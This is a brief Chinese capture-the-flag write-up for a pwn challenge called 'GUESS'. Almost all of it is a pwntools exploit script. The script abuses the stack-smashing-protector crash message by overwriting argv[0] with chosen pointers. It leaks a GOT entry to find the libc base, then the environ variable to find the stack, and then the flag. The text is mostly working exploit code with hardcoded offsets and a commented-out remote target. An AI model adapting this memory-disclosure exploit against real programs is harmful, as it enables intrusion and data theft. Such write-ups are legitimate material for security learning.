&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>因为这题非常简单，但我想到了泄露一个栈地址用来计算栈偏移泄露出flag但我不知道那个变量叫environ，在libc里面，诶还是经验不足啊</font></br>
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>典型的ssp我就不讲了，只要覆盖到argv[0]就能泄露任意地址了，但也不要过长。</font></br>

脚本
======

```python

from pwn import *

DEBUG=0

p=process('./GUESS')
#p=remote('106.75.90.160',9999)

if DEBUG==1:
  context.log_level='debug'
  gdb.attach(p)

leak_addr=0x602020

p.recv()

p.sendline(p64(leak_addr)*38)

#p.recv()
#p.recv()

p.recvuntil(': ')
libc_base=u64(p.recv(6).ljust(8,'\x00'))-0x6f690

log.info(hex(libc_base))
environ=libc_base+0x3C6F38

p.sendline(p64(environ)*38)
p.recvuntil(': ')
flag_addr=u64(p.recv(6).ljust(8,'\x00'))-0x168

log.info(hex(flag_addr))

p.sendline(p64(flag_addr)*38)
p.recvuntil(': ')
print p.recvline()

```
